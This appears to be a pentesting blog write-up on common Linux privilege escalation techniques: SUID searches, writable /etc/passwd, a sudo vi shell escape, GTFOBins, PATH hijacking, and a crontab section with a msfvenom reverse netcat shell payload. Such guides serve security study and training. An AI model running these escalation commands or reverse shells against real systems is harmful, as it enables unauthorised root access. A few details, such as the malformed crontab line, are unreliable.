---
date: '2025-02-01T23:22:44+05:30'
draft: false
title: 'Common Linux Privilege Escalation Techniques'
slug: common-linux-privesc
tags: ["linux", "privesc", "security", "pentesting", "root"]
category: writeups
showtoc: true
summary: A comprehensive guide to common Linux privilege escalation techniques including SUID abuse, crontab exploitation, and path variable manipulation
description: Detailed overview of various Linux privilege escalation methods, covering enumeration strategies, permission abuse, and practical exploitation techniques with examples
---

# Common Linux Privilege Escalation Techniques

## Understanding Privilege Escalation

Privilege escalation involves moving from lower permission levels to higher ones. This can happen in two directions:

1. **Horizontal Privilege Escalation**
   - Moving between user accounts at the same permission level
   - Example: Moving from one regular user to another

2. **Vertical Privilege Escalation**
   - Gaining higher privileges from current user account
   - Example: Moving from regular user to root

## Initial Enumeration

### Using LinEnum
[LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) is a powerful enumeration script. Key areas to focus on:

1. Kernel information
2. Sensitive file permissions (read/write)
3. SUID files
4. Crontab contents and jobs

### Basic System Information
Check available shells:
```bash
cat /etc/shells
```

## SUID/GUID File Abuse

### Understanding Permissions
- Execute (1)
- Write (2)
- Read (4)

### Finding SUID Files
```bash
find / -perm -u=s -type f 2>/dev/null
```

## Exploiting Writable /etc/passwd

1. Create password hash using openssl:
```bash
openssl passwd newpassword
```

2. Format for /etc/passwd entry:
```
username:password:uid:gid:uid-info:/home-directory:/shell-location
```

## Vi Editor Privilege Escalation

1. Check available sudo commands:
```bash
sudo -l
```

2. If vi is available with NOPASSWD:
```bash
User <user> may run the following commands:
    (root) NOPASSWD: /usr/bin/vi
```

3. Escalate privileges:
```bash
sudo /usr/bin/vi
:!sh
```

## GTFOBins Exploitation

1. During enumeration, identify misconfigured binaries
2. Reference [GTFOBins](https://gtfobins.github.io/) for specific exploitation techniques
3. Follow provided methods for privilege escalation

## Crontab Exploitation

1. View crontab contents:
```bash
cat /etc/crontab
```

2. Create reverse shell payload:
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```

3. Crontab format:
```
# m h dom mon dow user command
17 * 1 * * * root cd / && run-parts --report /etc/cron.hourly
```
- m = Minute
- h = Hour
- dom = Day of month
- mon = Month
- dow = Day of week
- user = Command executor
- command = Command to run

## Path Variable Exploitation

1. Create malicious command:
```bash
echo "/bin/bash" > ls
chmod +x ls
```

2. Modify PATH:
```bash
export PATH=/tmp:$PATH
```

3. Execute target file to trigger the malicious command

## Best Practices for Privilege Escalation

1. **Systematic Enumeration**
   - Use automated tools
   - Manual verification of findings
   - Document all discoveries

2. **Permission Checking**
   - File permissions
   - Directory permissions
   - Service permissions

3. **Configuration Review**
   - Crontab entries
   - Sudo permissions
   - Service configurations

4. **Safe Exploitation**
   - Backup critical files
   - Test commands when possible
   - Document changes made

## Additional Resources

1. [Linux Privilege Escalation Checklist](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
2. [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
3. [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
4. [Payatu Linux Privesc Guide](https://payatu.com/guide-linux-privilege-escalation)
